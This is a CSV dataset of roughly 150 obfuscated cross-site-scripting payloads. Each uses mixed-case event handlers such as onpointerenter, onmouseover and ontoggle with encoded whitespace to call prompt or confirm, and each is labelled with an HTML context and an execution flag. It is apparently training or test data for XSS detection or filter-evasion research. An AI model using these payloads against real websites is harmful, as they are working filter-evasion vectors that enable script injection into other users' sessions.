payload,context,exec,combined
"<d3V%0aOnpoiNtereNteR%0a=%0aa=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <d3V%0aOnpoiNtereNteR%0a=%0aa=prompt,a()>v3dm0s"
<A%0aONPoINTerEntEr+=+(confirm)()%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <A%0aONPoINTerEntEr+=+(confirm)()%0dx>v3dm0s
<D3V%09oNpoINteREnter%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <D3V%09oNpoINteREnter%0a=%0aconfirm()>v3dm0s
<A/+/ONmouSEOvEr%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/ONmouSEOvEr%0a=%0a[8].find(confirm)%0dx>v3dm0s
<D3V/+/ONpOiNterentER%09=%09confirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V/+/ONpOiNterentER%09=%09confirm()>v3dm0s
<A%09ONpOIntereNtER%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%09ONpOIntereNtER%09=%09confirm()%0dx>v3dm0s
<htML%0dONpoinTeRENTeR+=+confirm()%0dx>,html_text,0,CONTEXT_html_text <htML%0dONpoinTeRENTeR+=+confirm()%0dx>
<d3v%0dOnPOINtErenTEr%0d=%0dconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%0dOnPOINtErenTEr%0d=%0dconfirm()>v3dm0s
<A/+/oNpOINtErenter%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/oNpOINtErenter%09=%09(prompt)``%0dx>v3dm0s
<DeTailS%09ONtoggLE+=+(prompt)``//,html_tag,0,CONTEXT_html_tag <DeTailS%09ONtoggLE+=+(prompt)``//
<a%09oNMOuSEOvEr%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09oNMOuSEOvEr%0d=%0dconfirm()%0dx>v3dm0s
"<htML/+/oNmOUsEoVER%0d=%0da=prompt,a()%0dx>",html_tag,0,"CONTEXT_html_tag <htML/+/oNmOUsEoVER%0d=%0da=prompt,a()%0dx>"
<D3v%09OnPoINTErEntEr%09=%09confirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%09OnPoINTErEntEr%09=%09confirm()>v3dm0s
<d3v/+/OnpOintErENTEr%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v/+/OnpOintErENTEr%0a=%0aconfirm()%0dx>v3dm0s
<deTAiLs%0donpOINTeReNteR%0a=%0aconfirm()%0dx>,html_text,0,CONTEXT_html_text <deTAiLs%0donpOINTeReNteR%0a=%0aconfirm()%0dx>
<d3v%0aoNMOuseoVeR%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0aoNMOuseoVeR%0a=%0a[8].find(confirm)%0dx>v3dm0s
<d3v%09oNPoInTErEntEr%09=%09[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <d3v%09oNPoInTErEntEr%09=%09[8].find(confirm)>v3dm0s
<D3v%0donMoUSeOVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0donMoUSeOVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s
<deTAilS%09oNpOinteReNTeR%09=%09confirm()>,html_text,0,CONTEXT_html_text <deTAilS%09oNpOinteReNTeR%09=%09confirm()>
"<A%0donpOIntEreNTer%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <A%0donpOIntEreNTer%0a=%0aa=prompt,a()%0dx>v3dm0s"
"<HtMl%09onmOuseOvEr%0d=%0da=prompt,a()>",html_text,0,"CONTEXT_html_text <HtMl%09onmOuseOvEr%0d=%0da=prompt,a()>"
<d3V%0dONPoINteRENTer%0a=%0a(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0dONPoINteRENTer%0a=%0a(confirm)()%0dx>v3dm0s
<a/+/onMouseoVER%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <a/+/onMouseoVER%0a=%0aconfirm()>v3dm0s
<D3v%09ONMOUseOver%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%09ONMOUseOver%09=%09[8].find(confirm)%0dx>v3dm0s
<A%09onpointEREnTer%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%09onpointEREnTer%0d=%0dconfirm()%0dx>v3dm0s
<d3v/+/oNPOiNtErENtEr%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v/+/oNPOiNtErENtEr%09=%09[8].find(confirm)>v3dm0s
<DETaILs%0aOnpoiNtERenTEr+=+confirm()//,html_tag,0,CONTEXT_html_tag <DETaILs%0aOnpoiNtERenTEr+=+confirm()//
<A/+/onMOuSEOVER%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/onMOuSEOVER%09=%09[8].find(confirm)%0dx>v3dm0s
<Html/+/OnpoINteREnTEr%09=%09confirm()//,html_text,0,CONTEXT_html_text <Html/+/OnpoINteREnTEr%09=%09confirm()//
<d3v%0doNpoIntErEntEr+=+[8].find(confirm)>v3dm0s,html_tag,0,CONTEXT_html_tag <d3v%0doNpoIntErEntEr+=+[8].find(confirm)>v3dm0s
"<a/+/ONpoiNTeReNtER%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <a/+/ONpoiNTeReNtER%0d=%0da=prompt,a()>v3dm0s"
<a%09onmouSEoVER%0d=%0dconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09onmouSEoVER%0d=%0dconfirm()>v3dm0s
<a%0dONmoUSeOver+=+confirm()>v3dm0s,html_tag,0,CONTEXT_html_tag <a%0dONmoUSeOver+=+confirm()>v3dm0s
<deTaIlS%0aONToggle%09=%09(prompt)``%0dx>,html_tag,0,CONTEXT_html_tag <deTaIlS%0aONToggle%09=%09(prompt)``%0dx>
"<a%0aonmoUSeover%0a=%0aa=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <a%0aonmoUSeover%0a=%0aa=prompt,a()>v3dm0s"
<a%09onmouSEoVER%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <a%09onmouSEoVER%0d=%0dconfirm()>v3dm0s
<d3V%09oNMOuseoveR%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%09oNMOuseoveR%09=%09(prompt)``%0dx>v3dm0s
<dETAILs%09OnpOInteReNter%09=%09confirm()%0dx>,html_text,0,CONTEXT_html_text <dETAILs%09OnpOInteReNter%09=%09confirm()%0dx>
"<d3V/+/onmOUsEoVer%0a=%0aa=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <d3V/+/onmOUsEoVer%0a=%0aa=prompt,a()>v3dm0s"
<detAIlS%0aOnPoiNtEreNTer%0a=%0aconfirm()%0dx>,html_tag,0,CONTEXT_html_tag <detAIlS%0aOnPoiNtEreNTer%0a=%0aconfirm()%0dx>
<D3V/+/onMOUSEOvER%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3V/+/onMOUSEOvER%09=%09(confirm)()%0dx>v3dm0s
<d3V%0dONPOInteRENTer%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0dONPOInteRENTer%0d=%0dconfirm()%0dx>v3dm0s
<DEtailS%09oNpOINTerEnter%0d=%0d(confirm)()>,html_text,0,CONTEXT_html_text <DEtailS%09oNpOINTerEnter%0d=%0d(confirm)()>
<A%0aonPoIntEreNTeR%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aonPoIntEreNTeR%0a=%0a(prompt)``%0dx>v3dm0s
<htML%0doNpoiNTErENTer+=+(prompt)``%0dx>,html_tag,0,CONTEXT_html_tag <htML%0doNpoiNTErENTer+=+(prompt)``%0dx>
"<DETaiLs%0dONtOGGLE%09=%09a=prompt,a()%0dx>",html_text,0,"CONTEXT_html_text <DETaiLs%0dONtOGGLE%09=%09a=prompt,a()%0dx>"
<HtmL%09oNMOuseoVer%09=%09confirm()%0dx>,html_text,0,CONTEXT_html_text <HtmL%09oNMOuseoVer%09=%09confirm()%0dx>
"<A%0aONPoINTeRENTeR%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <A%0aONPoINTeRENTeR%0d=%0da=prompt,a()>v3dm0s"
<deTAILS/+/onTOGGle%0a=%0a[8].find(confirm)%0dx>,html_tag,0,CONTEXT_html_tag <deTAILS/+/onTOGGle%0a=%0a[8].find(confirm)%0dx>
<a/+/onpoiNTerenTEr%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/onpoiNTerenTEr%0a=%0a(prompt)``%0dx>v3dm0s
<A%0donmouSeOVER%09=%09confirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%0donmouSeOVER%09=%09confirm()%0dx>v3dm0s
<A%0donmouSeOVER%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0donmouSeOVER%09=%09confirm()%0dx>v3dm0s
<D3v%0dOnPOiNterEnteR%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0dOnPOiNterEnteR%0a=%0a[8].find(confirm)>v3dm0s
<a/+/oNPoINtERENteR%09=%09[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <a/+/oNPoINtERENteR%09=%09[8].find(confirm)>v3dm0s
<DETAiLS%0aOnPOInteRenTER%09=%09confirm()>,html_tag,0,CONTEXT_html_tag <DETAiLS%0aOnPOInteRenTER%09=%09confirm()>
<a/+/ONMoUseoVER%0a=%0a(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/ONMoUseoVER%0a=%0a(confirm)()%0dx>v3dm0s
<d3V%0aOnmOUSeOvEr%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0aOnmOUSeOvEr%0d=%0d[8].find(confirm)%0dx>v3dm0s
"<A%09OnmoUSeoVER%09=%09a=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <A%09OnmoUSeoVER%09=%09a=prompt,a()>v3dm0s"
"<A%09OnMoUSeOVEr%09=%09a=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <A%09OnMoUSeOVEr%09=%09a=prompt,a()>v3dm0s"
<d3V%0dONPOInteRENTer%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0dONPOInteRENTer%0d=%0dconfirm()%0dx>v3dm0s
"<D3V%0aONmousEoveR%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <D3V%0aONmousEoveR%0a=%0aa=prompt,a()%0dx>v3dm0s"
"<A%09ONpOInTeRenteR%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <A%09ONpOInTeRenteR%09=%09a=prompt,a()%0dx>v3dm0s"
<DEtAilS/+/ONToGgLE%0d=%0d[8].find(confirm)%0dx>,html_tag,0,CONTEXT_html_tag <DEtAilS/+/ONToGgLE%0d=%0d[8].find(confirm)%0dx>
<A%0aONmoUSEOVER%09=%09(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aONmoUSEOVER%09=%09(confirm)()>v3dm0s
"<d3v%0dONMOUsEoVEr%0a=%0aa=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <d3v%0dONMOUsEoVEr%0a=%0aa=prompt,a()>v3dm0s"
<HTml/+/onPoiNTERentER%09=%09(prompt)``%0dx>,html_text,0,CONTEXT_html_text <HTml/+/onPoiNTERentER%09=%09(prompt)``%0dx>
<d3V%09oNpOiNTEREntER%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%09oNpOiNTEREntER%0d=%0dconfirm()%0dx>v3dm0s
"<d3V/+/onmOUsEoVer%0a=%0aa=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <d3V/+/onmOUsEoVer%0a=%0aa=prompt,a()>v3dm0s"
<D3v%0aOnPOinterentER%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0aOnPOinterentER%09=%09[8].find(confirm)%0dx>v3dm0s
<a%0aOnMOuSEoVEr%0a=%0a(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0aOnMOuSEoVEr%0a=%0a(confirm)()%0dx>v3dm0s
<a%09onMOuSeover%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <a%09onMOuSeover%0d=%0dconfirm()>v3dm0s
<a%0dONPOINTErentER%09=%09(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <a%0dONPOINTErentER%09=%09(confirm)()>v3dm0s
<a%09oNpoiNteRenTER%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09oNpoiNteRenTER%0a=%0a[8].find(confirm)%0dx>v3dm0s
<DEtaIls/+/ONTogGlE%0a=%0a(prompt)``%0dx>,html_tag,0,CONTEXT_html_tag <DEtaIls/+/ONTogGlE%0a=%0a(prompt)``%0dx>
"<d3V%09onmOUsEOveR+=+a=prompt,a()>v3dm0s",html_tag,0,"CONTEXT_html_tag <d3V%09onmOUsEOveR+=+a=prompt,a()>v3dm0s"
<a/+/OnPOINteRenTEr%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <a/+/OnPOINteRenTEr%0a=%0aconfirm()>v3dm0s
<A%0aONmOuseoVEr%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <A%0aONmOuseoVEr%0d=%0dconfirm()>v3dm0s
<A%09oNPoinTERenteR%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <A%09oNPoinTERenteR%09=%09confirm()>v3dm0s
<deTAiLs%0donpOINTeReNteR%0a=%0aconfirm()%0dx>,html_tag,0,CONTEXT_html_tag <deTAiLs%0donpOINTeReNteR%0a=%0aconfirm()%0dx>
"<A%09OnmOUSEOver%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <A%09OnmOUSEOver%0d=%0da=prompt,a()>v3dm0s"
<a/+/oNPOINtEReNtEr%0d=%0d(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/oNPOINtEReNtEr%0d=%0d(confirm)()>v3dm0s
<DetAilS%0doNtOGgle%0a=%0aconfirm()%0dx>,html_tag,0,CONTEXT_html_tag <DetAilS%0doNtOGgle%0a=%0aconfirm()%0dx>
"<DETaiLS%0dONpoiNTErEntEr+=+a=prompt,a()%0dx//",html_tag,0,"CONTEXT_html_tag <DETaiLS%0dONpoiNTErEntEr+=+a=prompt,a()%0dx//"
<HtMl%0dOnPoinTEREnTeR%0a=%0aconfirm()>,html_text,0,CONTEXT_html_text <HtMl%0dOnPoinTEREnTeR%0a=%0aconfirm()>
<dETaiLS%0aonpointErENTER%09=%09(prompt)``%0dx>,html_text,0,CONTEXT_html_text <dETaiLS%0aonpointErENTER%09=%09(prompt)``%0dx>
<HtML%0dONpOINterenter%0a=%0aconfirm()>,html_text,0,CONTEXT_html_text <HtML%0dONpOINterenter%0a=%0aconfirm()>
<htmL%09onPOiNTERENTER%09=%09confirm()%0dx//,html_tag,0,CONTEXT_html_tag <htmL%09onPOiNTERENTER%09=%09confirm()%0dx//
<a%0doNmOusEoVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0doNmOusEoVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s
<A%09ONMouseOVeR%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%09ONMouseOVeR%0d=%0d(confirm)()%0dx>v3dm0s
<htML%0dONpoinTeRENTeR+=+confirm()%0dx>,html_tag,0,CONTEXT_html_tag <htML%0dONpoinTeRENTeR+=+confirm()%0dx>
<A%0aONmOuseoVEr%0d=%0dconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aONmOuseoVEr%0d=%0dconfirm()>v3dm0s
<D3V%09OnmOUsEoVEr%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%09OnmOUsEoVEr%09=%09[8].find(confirm)>v3dm0s
<deTaiLS%0aontOgGle+=+[8].find(confirm)//,html_text,0,CONTEXT_html_text <deTaiLS%0aontOgGle+=+[8].find(confirm)//
<A/+/ONpOInTeRENtEr+=+(confirm)()>v3dm0s,html_text,0,CONTEXT_html_text <A/+/ONpOInTeRENtEr+=+(confirm)()>v3dm0s
<d3V/+/oNmOuSEOver%09=%09confirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V/+/oNmOuSEOver%09=%09confirm()>v3dm0s
<DETaILs/+/ONtoGGLE%09=%09(prompt)``%0dx>,html_tag,0,CONTEXT_html_tag <DETaILs/+/ONtoGGLE%09=%09(prompt)``%0dx>
"<a/+/ONpoiNTeReNtER%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <a/+/ONpoiNTeReNtER%0d=%0da=prompt,a()>v3dm0s"
"<A%0aOnpoINTErEnTER+=+a=prompt,a()%0dx>v3dm0s",html_text,0,"CONTEXT_html_text <A%0aOnpoINTErEnTER+=+a=prompt,a()%0dx>v3dm0s"
<D3V%09onPoiNTERenTeR%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%09onPoiNTERenTeR%0a=%0a[8].find(confirm)>v3dm0s
<D3v%0donPOINtErENTER+=+confirm()>v3dm0s,html_text,0,CONTEXT_html_text <D3v%0donPOINtErENTER+=+confirm()>v3dm0s
<a%09oNMOuSEOvEr%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%09oNMOuSEOvEr%0d=%0dconfirm()%0dx>v3dm0s
<d3V%0dONpoiNteRENTeR%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0dONpoiNteRENTeR%09=%09(prompt)``%0dx>v3dm0s
<a%09OnpoINterEnTEr%09=%09(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09OnpoINterEnTEr%09=%09(prompt)``>v3dm0s
<html%0donmOuSEoVer%0d=%0d(prompt)``%0dx//,html_tag,0,CONTEXT_html_tag <html%0donmOuSEoVer%0d=%0d(prompt)``%0dx//
<hTMl%0aONPOinTERentER%09=%09[8].find(confirm)//,html_text,0,CONTEXT_html_text <hTMl%0aONPOinTERentER%09=%09[8].find(confirm)//
<d3V/+/oNmoUseOVeR%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V/+/oNmoUseOVeR%09=%09[8].find(confirm)>v3dm0s
"<DetAILs/+/onTogGlE%0d=%0da=prompt,a()>",html_tag,0,"CONTEXT_html_tag <DetAILs/+/onTogGlE%0d=%0da=prompt,a()>"
<dETailS%09OnPOiNTErENter+=+(confirm)()%0dx>,html_text,0,CONTEXT_html_text <dETailS%09OnPOiNTErENter+=+(confirm)()%0dx>
<dEtaILS/+/OnPOiNtErentER%09=%09confirm()>,html_text,0,CONTEXT_html_text <dEtaILS/+/OnPOiNtErentER%09=%09confirm()>
"<hTML/+/oNMouSEoVER%0a=%0aa=prompt,a()>",html_tag,0,"CONTEXT_html_tag <hTML/+/oNMouSEoVER%0a=%0aa=prompt,a()>"
<htmL%0aONMOUsEovER%0a=%0aconfirm()%0dx//,html_text,0,CONTEXT_html_text <htmL%0aONMOUsEovER%0a=%0aconfirm()%0dx//
<d3v%0dONMouSEOVEr%0d=%0d(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%0dONMouSEOVEr%0d=%0d(confirm)()>v3dm0s
<detailS/+/ontOggle%09=%09[8].find(confirm)//,html_text,0,CONTEXT_html_text <detailS/+/ontOggle%09=%09[8].find(confirm)//
<Html%09oNmOUSeovEr%0d=%0d[8].find(confirm)>,html_text,0,CONTEXT_html_text <Html%09oNmOUSeovEr%0d=%0d[8].find(confirm)>
<html/+/ONPOinterEnTER+=+(prompt)``//,html_text,0,CONTEXT_html_text <html/+/ONPOinterEnTER+=+(prompt)``//
<a%0aOnpOinTerEntEr%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aOnpOinTerEntEr%0a=%0aconfirm()%0dx>v3dm0s
"<D3v%09oNMouSeoVer+=+a=prompt,a()%0dx>v3dm0s",html_text,0,"CONTEXT_html_text <D3v%09oNMouSeoVer+=+a=prompt,a()%0dx>v3dm0s"
"<A%0donpOIntEreNTer%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <A%0donpOIntEreNTer%0a=%0aa=prompt,a()%0dx>v3dm0s"
<details%0dONtoGGle+=+[8].find(confirm)//,html_text,0,CONTEXT_html_text <details%0dONtoGGle+=+[8].find(confirm)//
<detAIlS%0dONtoGGLe%0a=%0a(confirm)()//,html_text,0,CONTEXT_html_text <detAIlS%0dONtoGGLe%0a=%0a(confirm)()//
<dEtAIls/+/OnpOIntereNTer%0a=%0aconfirm()//,html_text,0,CONTEXT_html_text <dEtAIls/+/OnpOIntereNTer%0a=%0aconfirm()//
<htmL%0dOnPoinTERenter+=+(confirm)()%0dx//,html_tag,0,CONTEXT_html_tag <htmL%0dOnPoinTERenter+=+(confirm)()%0dx//
<D3V/+/onmOUseOVeR%0a=%0a(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V/+/onmOUseOVeR%0a=%0a(confirm)()%0dx>v3dm0s
"<d3V%0aOnpoiNtereNteR%0a=%0aa=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <d3V%0aOnpoiNtereNteR%0a=%0aa=prompt,a()>v3dm0s"
<html%0dONMOUSEOver%0d=%0d[8].find(confirm)%0dx>,html_tag,0,CONTEXT_html_tag <html%0dONMOUSEOver%0d=%0d[8].find(confirm)%0dx>
"<A%0aOnpoINTErEnTER+=+a=prompt,a()%0dx>v3dm0s",html_tag,0,"CONTEXT_html_tag <A%0aOnpoINTErEnTER+=+a=prompt,a()%0dx>v3dm0s"
<D3v%0aONpOInTeREnTER%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0aONpOInTeREnTER%0a=%0a[8].find(confirm)%0dx>v3dm0s
<d3v%0aONPoInteRENTer%09=%09confirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0aONPoInteRENTer%09=%09confirm()%0dx>v3dm0s
<a%0aonMOusEoveR%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0aonMOusEoveR%0a=%0aconfirm()%0dx>v3dm0s
<a/+/ONpOINteReNtER%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/ONpOINteReNtER%0a=%0aconfirm()%0dx>v3dm0s
<A/+/OnPOINTeRenTEr%09=%09(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/OnPOINTeRenTEr%09=%09(confirm)()>v3dm0s
<htML%0donmOusEoveR%09=%09(prompt)``%0dx//,html_text,0,CONTEXT_html_text <htML%0donmOusEoveR%09=%09(prompt)``%0dx//
"<d3v%0dONMOUsEoVEr%0a=%0aa=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <d3v%0dONMOUsEoVEr%0a=%0aa=prompt,a()>v3dm0s"
<details%0dONtoGGle+=+[8].find(confirm)//,html_tag,0,CONTEXT_html_tag <details%0dONtoGGle+=+[8].find(confirm)//
"<D3V%0aONmousEoveR%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <D3V%0aONmousEoveR%0a=%0aa=prompt,a()%0dx>v3dm0s"
"<D3V%0dOnmoUsEOvER%09=%09a=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <D3V%0dOnmoUsEOvER%09=%09a=prompt,a()>v3dm0s"
<deTAILS/+/oNpOInTErENter+=+confirm()%0dx>,html_tag,0,CONTEXT_html_tag <deTAILS/+/oNpOInTErENter+=+confirm()%0dx>
<a%0aOnmOUseoVEr%0a=%0a(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <a%0aOnmOUseoVEr%0a=%0a(prompt)``>v3dm0s
<htmL/+/onmouSEoVeR%09=%09[8].find(confirm)%0dx>,html_text,0,CONTEXT_html_text <htmL/+/onmouSEoVeR%09=%09[8].find(confirm)%0dx>
<HtML%09oNmOuseoVer+=+confirm()>,html_text,0,CONTEXT_html_text <HtML%09oNmOuseoVer+=+confirm()>
<DeTAILs/+/oNtoGgLe+=+confirm()//,html_text,0,CONTEXT_html_text <DeTAILs/+/oNtoGgLe+=+confirm()//
"<dEtAIls%0doNPoiNteRenTEr+=+a=prompt,a()>",html_text,0,"CONTEXT_html_text <dEtAIls%0doNPoiNteRenTEr+=+a=prompt,a()>"
<htMl/+/onPoiNTEREntEr%09=%09(confirm)()//,html_text,0,CONTEXT_html_text <htMl/+/onPoiNTEREntEr%09=%09(confirm)()//
<d3V%0dOnpoIntErEntEr%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0dOnpoIntErEntEr%09=%09(confirm)()%0dx>v3dm0s
<HtmL/+/oNmousEOVer%0a=%0a(confirm)()//,html_text,0,CONTEXT_html_text <HtmL/+/oNmousEOVer%0a=%0a(confirm)()//
<d3V/+/OnpOInTerENtER%0a=%0a(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V/+/OnpOInTerENtER%0a=%0a(confirm)()>v3dm0s
<D3V/+/ONpOiNterentER%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <D3V/+/ONpOiNterentER%09=%09confirm()>v3dm0s
<htML%0doNpoiNTErENTer+=+(prompt)``%0dx>,html_text,0,CONTEXT_html_text <htML%0doNpoiNTErENTer+=+(prompt)``%0dx>
<HtMl%09ONmouseOVEr%0a=%0a(confirm)()%0dx//,html_tag,0,CONTEXT_html_tag <HtMl%09ONmouseOVEr%0a=%0a(confirm)()%0dx//
<d3V%0aonpoINTeRENTER%0a=%0a(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0aonpoINTeRENTER%0a=%0a(confirm)()>v3dm0s
<detAIlS%0dONtoGGLe%0a=%0a(confirm)()//,html_tag,0,CONTEXT_html_tag <detAIlS%0dONtoGGLe%0a=%0a(confirm)()//
"<a%0aonmoUSeover%0a=%0aa=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <a%0aonmoUSeover%0a=%0aa=prompt,a()>v3dm0s"
<A%0aonmOUseover%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aonmOUseover%0a=%0a[8].find(confirm)>v3dm0s
<d3v%09onpoiNTErENTEr%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3v%09onpoiNTErENTEr%0a=%0aconfirm()%0dx>v3dm0s
<A%0aONpoINtErenter%09=%09(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aONpoINtErenter%09=%09(confirm)()>v3dm0s
<HtMl%09ONmouseOVEr%0a=%0a(confirm)()%0dx//,html_text,0,CONTEXT_html_text <HtMl%09ONmouseOVEr%0a=%0a(confirm)()%0dx//
<D3v/+/ONMouseoVer%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v/+/ONMouseoVer%0d=%0d[8].find(confirm)%0dx>v3dm0s
